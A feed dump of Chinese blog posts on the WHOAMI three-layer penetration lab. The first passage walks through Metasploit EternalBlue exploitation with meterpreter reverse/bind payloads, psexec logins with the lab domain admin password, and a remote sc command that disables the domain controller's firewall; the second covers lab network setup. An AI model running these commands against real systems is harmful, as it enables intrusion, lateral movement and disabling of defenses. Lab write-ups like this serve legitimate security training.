number">192.168</span>.93.40<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.02.05.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.12.42.png" style="zoom:40%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.33.16.png" style="zoom:50%;"><p>上面是nmap的扫描结果，445端口开启，可以考虑尝试使用ms17_010进行渗透。</p><h1 id="十一、三层核心网渗透"><a href="#十一、三层核心网渗透" class="headerlink" title="十一、三层核心网渗透"></a>十一、三层核心网渗透</h1><h2 id="11-1-永恒之蓝"><a href="#11-1-永恒之蓝" class="headerlink" title="11.1 永恒之蓝"></a>11.1 永恒之蓝</h2><h3 id="11-1-1-漏洞检测"><a href="#11-1-1-漏洞检测" class="headerlink" title="11.1.1 漏洞检测"></a>11.1.1 漏洞检测</h3><p>通过添加路由将msf带入核心网之后，可以使用msf的扫描模块检测内网是否存在永恒之蓝漏洞。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auciliary/scanner/smb/smb_ms17_010<span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.93.30<span class="token builtin class-name">set</span> THREADS <span class="token number">50</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.21.01.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.21.50.png" style="zoom:50%;"><p>通过检测发现，93.30 、93.40这两台主机均存在永恒之蓝漏洞。</p><h3 id="11-1-2-漏洞利用"><a href="#11-1-2-漏洞利用" class="headerlink" title="11.1.2 漏洞利用"></a>11.1.2 漏洞利用</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">------------------use exploit/windows/smb/ms17_010_eternalblue<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.93.40<span class="token builtin class-name">set</span> LHOST <span class="token number">172.20</span>.10.4<span class="token builtin class-name">set</span> LPORT <span class="token number">8877</span>msf5 exploit<span class="token punctuation">(</span>windows/smb/ms17_010_eternalblue<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit----------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面这套流程走下来，利用失败了。</p><p>使用下面的参数设置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">setg Proxies socks5:127.0.0.1:1090use exploit/windows/smb/ms17_010_eternalblue<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp<span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.93.40<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.93.40<span class="token builtin class-name">set</span> LPORT <span class="token number">8877</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.40.45.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.41.11.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.42.05.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2011.43.10.png" alt="截屏2025-01-20 11.43.10" style="zoom:50%;"><p>成功拿下三层核心网的主机PC2！</p><h1 id="十二、攻击域控"><a href="#十二、攻击域控" class="headerlink" title="十二、攻击域控"></a>十二、攻击域控</h1><p>其实，在上一小节已经探测到93.30这台主机存在ms17-010漏洞了。可以直接尝试使用ms12-010拿下域控制器，这里先尝试直接登录。</p><h2 id="12-1-psexec登陆"><a href="#12-1-psexec登陆" class="headerlink" title="12.1 psexec登陆"></a>12.1 psexec登陆</h2><p>现在我们手头已经有域管理密码(Whoami2021)了，可以尝试直接psexec登陆。</p><p><code>exploit/windows/smb/psexec</code> 是 Metasploit 框架中的一个模块，用于通过 SMB 服务利用目标主机的漏洞，从而实现远程代码执行。该模块通常利用 Windows 的 <code>psexec</code> 功能，通过有效的用户凭据在目标系统上执行命令或获取 Meterpreter 会话。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/windows/smb/psexec<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.93.30<span class="token builtin class-name">set</span> SMBUser administrator<span class="token builtin class-name">set</span> SMBPass Whoami2021<span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.93.30<span class="token builtin class-name">set</span> lport <span class="token number">7777</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.37.45.png" style="zoom:50%;"><p>登录失败了，可能是防火墙的原因。</p><h2 id="12-2-关闭域控防火墙"><a href="#12-2-关闭域控防火墙" class="headerlink" title="12.2 关闭域控防火墙"></a>12.2 关闭域控防火墙</h2><p>既然我们有域控制器的密码，也拿下了域内主机PC2的system权限，并且目标系统存在IPC共享，我们可以从PC2远程关闭域控的防火墙。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30<span class="token punctuation">\</span>ipc$ <span class="token string">"Whoami2021"</span> /user:<span class="token string">"Administrator"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.43.44.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.44.50.png" style="zoom:40%;"><p>然后执行如下命令，使用sc远程在域制器（192.168.93.30）上创建服务关闭防火墙：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sc <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30 create unablefirewall <span class="token assign-left variable">binpath</span><span class="token operator">=</span> <span class="token string">"netsh advfirewall set allprofiles state off"</span>sc <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30 start unablefirewall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.48.25.png" style="zoom:50%;"><h2 id="12-3-重新登录"><a href="#12-3-重新登录" class="headerlink" title="12.3 重新登录"></a>12.3 重新登录</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.50.12.png" style="zoom:50%;"><p>成功获取meterpter连接。</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-20%2013.52.48.png" style="zoom:50%;"><p>成功拿下域控！✅</p><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>关于本次三层网络靶场的综合渗透实战，涉及到的技术比较全面，从外网打点、内网横向到攻击域控。下面总结一下：</p><ul><li><p>拿下某个区域的某个主机所涉及的技术点：</p><ul><li><p>DMZ-web1：Redis未授权访问getshell</p></li><li><p>二层-web2：Laravel RCE CVE-2021-3129、php反弹shell、suid权限提升、Docker容器逃逸。</p></li><li><p>二层-PC1：隧道搭建、通达OA RCE </p></li><li><p>三层-PC2：隧道搭建、ms17-010</p></li><li><p>三层-DC：smb/psexec</p></li></ul></li><li><p>所使用的重点工具:</p><ul><li><p>nmap</p></li><li><p>CVE-2021-3129 POC</p></li><li><p>蚁剑</p></li><li><p>Metasploit Framework</p></li><li><p>Earthworm</p></li><li><p>proxychains</p></li><li><p>Godzilla</p></li><li><p>msfvenom</p></li><li><p>kiwi</p></li><li><p>Tongda_scan</p></li></ul></li></ul><p>很多技术都是第一次用，再接再励！</p>]]></content>
      
      
      <categories>
          
          <category> 综合渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网攻防 </tag>
            
            <tag> 隧道搭建 </tag>
            
            <tag> 综合渗透 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> WHOAMI靶场 </tag>
            
            <tag> 内网横向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三层网络域渗透靶场（WHOAMII）搭建</title>
      <link href="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/"/>
      <url>/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="一、靶场环境简介"><a href="#一、靶场环境简介" class="headerlink" title="一、靶场环境简介"></a>一、靶场环境简介</h1><p>靶场下载地址：<a href="https://pan.baidu.com/s/1X5UQ66sUi-UphnXWs9zFuA">https://pan.baidu.com/s/1X5UQ66sUi-UphnXWs9zFuA</a> 提取码: 6777 【27.8 GB】</p><h2 id="1-1-五靶机-三层网络环境"><a href="#1-1-五靶机-三层网络环境" class="headerlink" title="1.1 五靶机+三层网络环境"></a>1.1 五靶机+三层网络环境</h2><p>1）DMZ区：IP段为192.168.1.1/24 【后续具体搭建时根据具体情况有所变动变动，跟物理机所处的环境相关。】</p><p>2）第二层网络环境：IP段为192.168.52.1/24 </p><p>3）第三层网络环境：IP段为192.168.93.1/24</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2009.45.39.png" alt="靶场网络拓扑结构" style="zoom:35%;"><h1 id="二、靶场基础环境搭建"><a href="#二、靶场基础环境搭建" class="headerlink" title="二、靶场基础环境搭建"></a>二、靶场基础环境搭建</h1><h2 id="2-1-VMware的三种网络模式"><a href="#2-1-VMware的三种网络模式" class="headerlink" title="2.1  VMware的三种网络模式"></a>2.1  VMware的三种网络模式</h2><blockquote><p>WMware的三种网络模式：</p><ol><li><strong>桥接模式（Bridged）</strong>：在这种模式下，虚拟机直接连接到宿主机所在的物理网络中，就像它是该网络中的另一台独立计算机一样。虚拟机和宿主机在同一个物理网络上拥有平等的地位，并且可以各自获得独立的IP地址。虚拟机通常通过DHCP服务器自动获取IP地址、子网掩码、默认网关和DNS服务器信息，如果没有可用的DHCP服务器，则需要手动配置静态IP地址。由于虚拟机直接连接到物理网络，其他网络设备可以看到并直接与虚拟机通信，就如同它们是一台实体机器。</li><li><strong>NAT模式（网络地址转换模式）</strong>：NAT模式通过虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。在这种模式下，虚拟机通过宿主机访问外部网络，虚拟机的网络流量会经过宿主机的NAT设备进行地址转换。虚拟机共享宿主机的IP地址来访问外部网络，因此它们在外部网络上不具有独立的IP地址。这种模式适合于IP地址资源有限的环境，并且可以提供一定程度的网络安全。</li><li><strong>仅主机模式（Host-Only）</strong>：仅主机模式创建了一个完全包含在宿主机中的专用网络，虚拟机与宿主机之间的网络连接仅对宿主机可见。在这种模式下，虚拟机不能直接访问外部网络，但可以与宿主机进行通信。如果需要，可以通过配置额外的网络设备（如虚拟路由器）来实现虚拟机之间的通信。</li></ol><p>​    当我们安装 VMware 时，VMware 会自动为 3 种网络连接模式各自创建 1 个虚拟机网络**：VMnet0 (桥接模式)<strong>、</strong>VMnet8 (NAT模式)<strong>、</strong>VMnet1 (仅主机模式)**。此外，我们也可以根据需要自行创建更多的虚拟网络。VMware 的虚拟网络都是以 “VMnet+数字” 的形式来命名的，例如 VMnet0、VMnet1、VMnet2……以此类推，在 Linux 系统的主机上，虚拟网络的名称均采用小写形式，例如 vmnet0 。</p><p>​    虚拟机上的网络连接图示：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2009.51.21.png" style="zoom:50%;"></blockquote><p>在Vmware中新增两个虚拟网卡VMnet8（内置的NAT虚拟网络）、VMnet14。</p><p>VMnet8设为默认的NAT模式，IP段设为192.168.52.0/24；</p><p>VMnet14设为仅主机模式，IP段设为192.168.93.0/24：</p><p>注意：VMnet8为VMware设置的默认NAT模式的虚拟网段，可能其IP地址段和靶场环境所要求的不一致，可以在虚拟网络编辑器中修改（windows）。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2009.55.13.png" style="zoom:50%;"><p>在mac系统中，由于虚拟网络都是vmnet（小写）+数字，所以跟靶机预设的网卡不匹配，需要重新搭建虚拟网络并配置各个靶机的网卡，而不是仅仅设置VMnet8和VMnet14虚拟网络。</p><h2 id="2-2-虚拟机和相关系统的账户密码"><a href="#2-2-虚拟机和相关系统的账户密码" class="headerlink" title="2.2 虚拟机和相关系统的账户密码"></a>2.2 虚拟机和相关系统的账户密码</h2><p>web 1：</p><ul><li>ubuntu：web2021</li></ul><p>web 2：</p><ul><li>ubuntu：ubuntu</li></ul><p>域用户账户和密码如下：</p><ul><li>Administrator：Whoami2021</li><li>whoami：Whoami2021 </li><li>bunny：Bunny2021 【PC1】</li><li>moretz：Moretz2021</li></ul><h2 id="2-3-虚拟机无法启动问题解决"><a href="#2-3-虚拟机无法启动问题解决" class="headerlink" title="2.3 虚拟机无法启动问题解决"></a>2.3 虚拟机无法启动问题解决</h2><blockquote><p>mac环境打开虚拟机时的踩坑记录：</p><ul><li>问题：直接运行vmx文件打不开虚拟机，报如下的错误：</li></ul><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2010.38.46.png" style="zoom:50%;"><p>​     1）尝试删除lck文件，无效。 </p><p>​     2）尝试修改vmx文件的vmci0.present = “TRUE”为FALSE，无效。</p><p>​     3）尝试在解压后的项目文件夹添加.vmwarevm后缀，打开时仍然报相同的错。</p><p>​     4）VMware fusion直接从现有磁盘新建虚拟机，磁盘选择从vmware workstation导出的虚拟机的vmdk文件。</p><p>​     参考：<a href="https://blog.csdn.net/u014028317/article/details/97311660">https://blog.csdn.net/u014028317/article/details/97311660</a></p><p>​     但是笔者按照此教程操作，出现的问题是vmdk文件灰色无法选中，   目前没找到解决办法。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2010.23.56.png" style="zoom:50%;"><ul><li>解决：最后的解决方法是按照scsi0:0.fileName的配置修改相关的文件名</li></ul><p>每次点击vmx文件启动的时候，提示的是“Ubuntu 64 位 (Web 1).vmdk文件找不到”，一看本身解压虚拟机之后的文件名确实不符合要求，带个奇奇怪怪的ג（本来看这个ג不顺眼），把所有带ג的文件名都改成”Ubuntu 64 位 (Web 1)…”。</p><p>然后再双击vmx启动，搞定：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2011.28.47.png" style="zoom: 30%;"><p>靠互联网不如靠自己排查：1）详细阅读思考提示信息。2）排查系统运行日志。</p><p>靶场环境中的其他虚拟机的启动如果遇到类似的问题，解决方法也是对照vmx文件的scsi0:0.fileName 的配置修改相应的文件名即可。</p></blockquote><h2 id="2-4-靶场环境搭建"><a href="#2-4-靶场环境搭建" class="headerlink" title="2.4 靶场环境搭建"></a>2.4 靶场环境搭建</h2><p>下面是我梳理的靶场的逻辑架构，搭建的过程中重点在于搞清楚网络间的互访关系、虚拟网络的设置和各主机的网卡连接。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2014.42.59.png" alt="靶场环境示意图" style="zoom:50%;"><p>我的mac上目前的NAT网段地址是192.168.155.0/24。</p><p>一开始的时候我的想法是新建一个vmnet，设置为NAT模式，并且配置为192.168.52.0/24网段，设置如下：</p><p>（但是，后面发现这种设置方法会导致二层网络（192.168.52.0/24网段）无法访问互联网，所以我最后还是用的自带的NAT vmnet8虚拟网络，具体设置后面有详细的踩坑记录）</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2013.49.05.png" alt="vmnet2的配置（使用NAT）" style="zoom:40%;"><p>新建一个仅主机模式的vmnet14，设置如下：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2013.47.59.png" alt="vmnet14的配置（仅主机模式）" style="zoom:40%;"><p>将vmnet2作为第二层虚拟网络，vmnet14作为第三层虚拟网络。这样以来：</p><ul><li>第二层网络中的所有主机皆可以上网（NAT模式），但是位于第三层网络中的所有主机都不与外网相连通，不能上网。</li><li>DMZ区中的web1服务器可以访问互联网（通过两块网卡均可），通过桥接的方式将web1暴露在局域网中（模拟暴露在互联网）。</li><li>hacker虚拟机（kali）通过桥接的方式与web1、物理机共同处于一个局域网，模拟黑客从互联网对DMZ区发起攻击打点。</li></ul><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2014.52.05.png" alt="kali攻击机" style="zoom:35%;"><p>ping DMZ区的web1可以连通：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2014.52.37.png" alt="ping web1" style="zoom:40%;"><p>ping 二层网络是无法连通的：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2014.53.50.png" alt="ping web1的另一个网卡是无法ping通的" style="zoom:40%;"><p>ping web1的另一个网卡是无法ping通的，攻击机只能通过桥接方式暴露出来的192.168.43.253端口进行渗透。</p><h2 id="2-5-网络连通性测试"><a href="#2-5-网络连通性测试" class="headerlink" title="2.5 网络连通性测试"></a>2.5 网络连通性测试</h2><h3 id="2-5-1-核心网（三层网络）内部连通性"><a href="#2-5-1-核心网（三层网络）内部连通性" class="headerlink" title="2.5.1 核心网（三层网络）内部连通性"></a>2.5.1 核心网（三层网络）内部连通性</h3><p>DC和PC2可以互相访问</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.01.07.png" alt="核心网DC与PC2连通性测试" style="zoom:50%;"><h3 id="2-5-2-核心网和二层网络的连通性"><a href="#2-5-2-核心网和二层网络的连通性" class="headerlink" title="2.5.2 核心网和二层网络的连通性"></a>2.5.2 核心网和二层网络的连通性</h3><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.06.23.png" alt="核心网和二层网络之间的联通性" style="zoom:50%;"><p>PC1可以ping通DC和PC2，但是反之不行，分析可能是PC1的防火墙影响。</p><h3 id="2-5-3-DMZ与二层网络的连通性"><a href="#2-5-3-DMZ与二层网络的连通性" class="headerlink" title="2.5.3 DMZ与二层网络的连通性"></a>2.5.3 DMZ与二层网络的连通性</h3><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.07.48.png" style="zoom:50%;"><h3 id="2-5-4-DMZ访问互联网"><a href="#2-5-4-DMZ访问互联网" class="headerlink" title="2.5.4 DMZ访问互联网"></a>2.5.4 DMZ访问互联网</h3><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.10.35.png" alt="DMZ区可以访问互联网" style="zoom:50%;"><h3 id="2-5-5-二层网络访问互联网"><a href="#2-5-5-二层网络访问互联网" class="headerlink" title="2.5.5 二层网络访问互联网"></a>2.5.5 二层网络访问互联网</h3><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.11.18.png" alt="二层网络无法访问互联网" style="zoom:50%;"><p>二层网络发现无法访问互联网，分析可能是新设置的NAT模式的vmnet2未生效，因此决定修改默认vmnet8的NAT网段（填一开始偷懒的坑）：</p><blockquote><ol><li><p><strong>修改网络配置文件</strong>：</p><ul><li><p>打开终端，使用以下命令编辑VMware Fusion的网络配置文件：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo vi /Library/Preferences/VMware\ Fusion/networking<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在该文件中，找到与NAT相关的配置部分，例如<code>vmnet8</code>，然后修改<code>SUBNET</code>为想要的网段，例如<code>192.168.52.0</code>。同时，将<code>DHCP</code>设置为<code>no</code>以使用静态IP（后面发现不需要将DHCP设置为no）。</p></li></ul></li><li><p><strong>修改NAT配置文件</strong>：</p><ul><li><p>继续在终端中编辑NAT配置文件：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">sudo vi /Library/Preferences/VMware\ Fusion/vmnet8/nat.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在该文件中，设置网关地址，例如<code>192.168.52.1</code>，确保网关的IP与设置的网段一致。</p></li></ul></li></ol><p>networking原始配置：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.27.16.png" style="zoom:53%;"><p>networking修改后的配置：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.28.50.png" style="zoom:50%;"><p>nat.conf原始配置：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.33.05.png" alt="截屏2024-12-30 15.33.05" style="zoom:50%;"><p>nat.conf修改后的配置：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.33.32.png" alt="截屏2024-12-30 15.33.32" style="zoom:50%;"><p>重启vmware fusion。</p></blockquote><p>修改完成之后虚拟机如果还是原先的设置，即二层网络都在vmnet2（192.168.52.0/24）中。ping baidu.com不通，无法访问互联网。尝试取消vmnet2的NAT选项，还是不行。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.39.27.png" alt style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.40.29.png" alt="截屏2024-12-30 15.40.29" style="zoom:50%;"><p>所以，将所有连接二层网络的虚拟机的对应网络适配器改成NAT模式（vmnet8），测试之前的NAT网段更改是否生效。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.49.34.png" style="zoom:60%;"><p>发现还是无法访问互联网，分析可能因为老版本的vmware在创建虚拟网络的时候会把vmnetx虚拟网卡的ip设置为x.x.x..1，把虚拟网络的网关设置为x.x.x.2，所以直接下载来的虚拟机本身也遵循了这个x.x.x.2的网关配置。所以要么改vmnet8虚拟网络的设置，要么改虚拟机本身的配置。</p><p>首先，尝试将vmnet8的网关设置为x.x.x.2，改完之后重启VMware，发现网关的ip又变成192.168.52.1了且二层虚拟机仍然无法访问互联网。</p><blockquote><p>Fusion 12.0 开始 NAT 网关的 IP 变更为 x.x.x.1，更加符合使用习惯。</p><p>经测试 Fusion 12.1 NAT 网关 IP 同样为 x.x.x.1，但是比较遗憾，Fusion 12.2 又修改为 .2。</p><p>如果虚拟机本身的配置不正确将导致VM 无法访问外部网络。</p></blockquote><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.54.14.png" style="zoom:50%;"><p>我用的vmware fusion的版本是**专业版 12.1.2 (17964953)**，所以fusion可能强制将网关的ip应该和虚拟网卡的ip保持一致，都是x.x.x.1。</p><p>那么第一种方式（改vmnet8网关配置）不行，就只能修改虚拟机本身的网络配置了。</p><h4 id="1）二层网络——web2"><a href="#1）二层网络——web2" class="headerlink" title="1）二层网络——web2"></a>1）二层网络——web2</h4><ul><li>网卡配置</li></ul><p>查看ubuntu web2的网卡配置：</p><p><code>cat /etc/network/interfaces</code></p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.57.01.png" style="zoom:50%;"><p>发现网关配置果然是192.168.52.2，改成192.168.52.1。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2015.58.35.png" alt="截屏2024-12-30 15.58.35" style="zoom:50%;"><p>启动网卡：<code>sudo ifup eth0</code></p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.05.29.png" style="zoom:50%;"><p>ping不通baidu，但能ping通8.8.8.8，说明能访问互联网了，但是域名解析有问题。</p><ul><li>域名解析配置</li></ul><p>查看域名解析的配置，发现配置的是192.168.52.2，所以修改成192.168.52.1</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.06.20.png" style="zoom:50%;"><p>最终成功联通互联网。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.07.24.png" style="zoom:50%;"><p>涉及到vmnet2的所有网卡都需要重新进行适配。</p><h4 id="2）二层网络——PC1"><a href="#2）二层网络——PC1" class="headerlink" title="2）二层网络——PC1"></a>2）二层网络——PC1</h4><p>修改网卡配置的时候需要登录域管理员账户，需要启动DC。</p><p>修改前的配置：</p><p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.16.00.png" alt="截屏2024-12-30 16.16.00"></p><p>修改后：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.16.51.png" style="zoom:90%;"><p>默认网关和DNS服务器都改成192.168.52.1。</p><ul><li>待网卡生效后测试发现还是无法访问互联网和web2：</li></ul><p>尝试关闭防火墙尝试（也需要域管理员权限）。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.30.11.png" style="zoom:50%;"><p>本来web2无法ping通PC1，现在可以了。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.31.07.png" style="zoom:50%;"><p>但PC1还是无法访问互联网，并且PC1也无法访问web2。</p><img 